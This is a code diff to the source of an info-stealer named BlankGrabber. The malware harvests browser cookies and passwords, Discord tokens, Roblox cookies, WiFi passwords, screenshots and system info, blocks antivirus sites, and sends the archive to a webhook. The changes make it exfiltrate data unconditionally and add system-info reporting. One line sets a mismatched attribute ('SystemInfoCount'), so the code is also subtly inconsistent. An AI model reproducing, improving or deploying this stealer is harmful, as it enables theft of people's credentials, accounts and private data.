@@ -233,7 +233,7 @@ class Utility:
         return passwords
     
     @staticmethod
-    def Tree(path: str | tuple, prefix: str = ""): # Generates a tree for the given path
+    def Tree(path: str | tuple, prefix: str = "", base_has_files: bool = False): # Generates a tree for the given path
         def GetSize(_path: str) -> int:
             size = 0
             if os.path.isfile(_path):
@@ -270,7 +270,7 @@ class Utility:
 
         for item in folders:
             yield prefix + body[count] + DIRICON + os.path.basename(item) + " (%d items, %.2f KB)" % (len(os.listdir(item)), GetSize(item)/1024)
-            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else PIPE)
+            yield from Utility.Tree(item, prefix + (EMPTY if count == len(body) - 1 else PIPE) if prefix else (PIPE if count == 0 or base_has_files else EMPTY), files and not prefix)
             count += 1
         
         for item in files:
@@ -821,7 +821,8 @@ class BlankGrabber:
     RobloxCookies: list = [] # List of Roblox cookies collected
     DiscordTokens: list = [] # List of Discord tokens collected
     WifiPasswords: list = [] # List of WiFi passwords collected
-    Screenshot: int = 0 # Number of screenshots taken
+    Screenshot: bool = False # Indicates whether screenshot was collected or not
+    SystemInfo: bool = False # Indicates whether system info was collected or not
     MinecraftSessions: int = 0 # Number of Minecraft session files collected
     WebcamPictures: int = 0 # Number of webcam snapshots collected
     TelegramSessions: int = 0 # Number of Telegram sessions collected
@@ -1053,6 +1054,7 @@ class BlankGrabber:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                     file.write(output)
+                self.SystemInfoCount = True
         
     @Errors.Catch
     def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
@@ -1079,6 +1081,7 @@ class BlankGrabber:
                 os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
                 with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
                     file.write(value)
+                self.SystemInfo = True
     
     @Errors.Catch
     def GetClipboard(self) -> None: # Copies text from the clipboard
@@ -1142,7 +1145,7 @@ class BlankGrabber:
                 xdisplay=None
             )
             image.save(os.path.join(self.TempFolder, "Screenshot.png"), "png")
-            self.Screenshot += 1
+            self.Screenshot = True
 
     @Errors.Catch
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
@@ -1152,6 +1155,9 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
+        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory)):
+            return
+
         threads: list[Thread] = []
         paths = {
             "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
@@ -1386,7 +1392,7 @@ class BlankGrabber:
 
     def SendData(self) -> None: # Sends data to the webhook
         extention = self.CreateArchive()
-        if (self.Cookies or self.Passwords or self.EpicCount or self.TelegramSessions or self.SteamCount or self.WalletsCount or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
+        if os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
             totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
@@ -1422,6 +1428,7 @@ class BlankGrabber:
                             "Epic Sessions" : self.EpicCount,
                             "Steam Sessions" : self.SteamCount,
                             "Screenshot" : self.Screenshot,
+                            "System Info" : self.SystemInfo,
                             "Webcam" : self.WebcamPictures
             }
             
